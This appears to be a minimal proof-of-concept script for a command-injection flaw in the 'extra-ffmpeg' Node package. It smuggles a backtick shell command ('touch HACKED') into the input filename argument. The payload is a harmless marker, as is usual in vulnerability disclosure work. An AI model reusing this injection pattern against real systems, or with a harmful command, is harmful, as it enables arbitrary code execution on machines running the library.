const ffmpeg = require('extra-ffmpeg');
ffmpeg.sync([{y: true}, {i: '`touch HACKED`'}, {acodec: 'copy', o: 'aud.mp3'}]);
